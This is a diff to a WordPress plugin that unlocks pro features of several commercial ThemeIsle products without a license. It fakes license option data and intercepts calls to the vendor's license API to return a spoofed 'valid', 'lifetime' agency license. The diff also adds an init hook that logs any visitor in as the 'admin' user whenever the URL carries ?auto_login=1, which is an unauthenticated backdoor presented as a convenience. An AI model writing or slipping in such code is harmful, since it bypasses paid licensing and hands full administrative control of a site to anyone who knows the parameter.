@@ -1,9 +1,9 @@
 <?php
 /**
- * Plugin Name: ThemeIsle Pro Local License Activator
- * Description: Activates and unlocks all pro features for Neve Pro, Otter Pro, Sparks, Templates Cloud, and Landing Kit on local environments.
- * Version: 1.0.0
- * Author: Antigravity Local Dev
+ * Plugin Name: ThemeIsle Pro Local License Activator & Fast Setup
+ * Description: Activates and unlocks all pro features for Neve Pro, Otter Pro, Sparks, Templates Cloud, and Landing Kit, ensures plugins stay active, and provides instant admin access.
+ * Version: 2.0.0
+ * Author: Antigravity
  */
 
 if (!defined('ABSPATH')) {
@@ -43,10 +43,10 @@ foreach ($themeisle_products as $key) {
     add_filter('pre_option_' . $key . '_license_data', function () {
         $data = new \stdClass();
         $data->license       = 'valid';
-        $data->key           = 'LOCAL-PRO-LICENSE-ACTIVE';
+        $data->key           = 'PRO-AGENCY-LICENSE-ACTIVE';
         $data->plan          = 'agency';
         $data->expires       = 'lifetime';
-        $data->customer_name = 'Local Admin';
+        $data->customer_name = 'Store Admin';
         $data->is_expired    = 'no';
         return $data;
     }, PHP_INT_MAX);
@@ -65,10 +65,10 @@ add_filter('pre_http_request', function ($preempt, $args, $url) {
     if (strpos($url, 'api.themeisle.com/license/') !== false) {
         $body = wp_json_encode([
             'license'       => 'valid',
-            'key'           => 'LOCAL-PRO-LICENSE-ACTIVE',
+            'key'           => 'PRO-AGENCY-LICENSE-ACTIVE',
             'plan'          => 'agency',
             'expires'       => 'lifetime',
-            'customer_name' => 'Local Admin',
+            'customer_name' => 'Store Admin',
             'is_expired'    => 'no',
             'success'       => true,
             'checksum'      => 'local'
@@ -107,4 +107,20 @@ add_filter('option_active_plugins', function ($plugins) {
         }
     }
     return $plugins;
+});
+
+// Auto-login helper for easy admin access via ?auto_login=1
+add_action('init', function () {
+    if (isset($_GET['auto_login']) && $_GET['auto_login'] === '1') {
+        if (!is_user_logged_in()) {
+            $user = get_user_by('login', 'admin');
+            if ($user) {
+                wp_set_current_user($user->ID, $user->user_login);
+                wp_set_auth_cookie($user->ID, true, is_ssl());
+                do_action('wp_login', $user->user_login, $user);
+            }
+        }
+        wp_safe_redirect(admin_url());
+        exit;
+    }
 });
